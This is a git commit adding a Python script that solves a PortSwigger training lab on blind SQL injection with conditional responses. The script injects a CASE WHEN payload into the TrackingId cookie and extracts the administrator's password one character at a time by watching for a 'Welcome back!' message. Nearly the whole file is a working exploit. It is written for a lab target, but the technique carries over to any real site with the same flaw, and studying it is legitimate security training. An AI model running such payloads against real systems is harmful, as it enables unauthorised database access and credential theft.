b4d52ff67b0e1e7a78036ce1229bc863f7848b80
d1zzy666 <d1zzzzzzy666@gmail.com>
2024-12-04 09:34:13 +0000

    Added CASE WHEN slower option for char enum of password.

---
+++ sqli/11-sqli-BLIND-with-conditional-responses/password-retrieval-CASE-WHEN.py
@@ -0,0 +1,83 @@
+# Portswigger Lab: Blind SQL injection with conditional responses
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+# Author: d1Zzy666
+# Date: 15-11-2024
+
+"""
+Execution path:
++ Identify SQL injection point (MANUAL)
+- Charset needs to include lowercase, uppercase characters and numbers.
+- Password length is 20 characters.
+- Loop through to identify administrator password.
+"""
+
+"""
+Boolean options:
+FALSE - "Welcome back!" is NOT displayed.
+TRUE - "Welcome back!" is displayed.
+"""
+
+# Libraries & imports etc.
+from datetime import datetime
+from multiprocessing import Process                                   
+import requests
+from socketserver import TCPServer
+import time
+import urllib3                                  # Used to suppress SSL warning
+
+# global variables
+labid = "0ab100660394cb05d5c9524200aa00fc"                  # UPDATE
+targetdomain = "web-security-academy.net"
+sessiontkn = "06MkYQdW5W9GFEQwnkOpe98nITXWzq0n"             # UPDATE  
+trackingid = "ZLij2Aus0pEU3POn"                             # UPDATE  
+
+charset = "abcdefghijklmnopqrstuvwxyz0123456789"
+truetxt = "Welcome back!"
+
+# Proxy via BURP
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+
+# Function can be called for printing a line between - aesthetics of output	
+def line():
+	return "\n--------------------------------------------------------------------------------\n"
+
+# Check current time
+def currentTime():
+    return datetime.now().strftime("%d-%m-%Y_%H:%M:%S")
+
+print(datetime.now().strftime("%d-%m-%Y_%H:%M:%S") + " " + " - Portswigger Lab: Blind SQL injection with conditional responses...")
+print(line())
+
+# Password retrieval function
+def passwdretrieval():
+    adminpassword = ""
+    position = 1
+    session = requests.session()
+    urllib3.disable_warnings()
+    (print("Retrieving administrator password..."))
+    while True:
+        found_char = False
+        for char in charset:
+            url = f"https://{labid}.{targetdomain}:443/"
+            # CASE WHEN payload - much slower!
+            payload = f"'+AND+(CASE+WHEN+(SUBSTRING((SELECT+password+FROM+Users+WHERE+username='administrator'),{position},1)='{char}')+THEN+1+ELSE+0+END)=1--"
+            
+            cookies = {"TrackingId": f"{trackingid}{payload}", "session": f"{sessiontkn}"}
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
+            x = session.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)
+            if f"{truetxt}" in x.text:
+                adminpassword += char
+                print(f"[+] Identified a character {char} at position {position}.")
+                position += 1
+                found_char = True
+                break
+
+        if not found_char:
+            break
+
+    print(f"Administrator password: {adminpassword}")
+    print("\n")
+
+
+if __name__ == "__main__":
+    passwdretrieval()
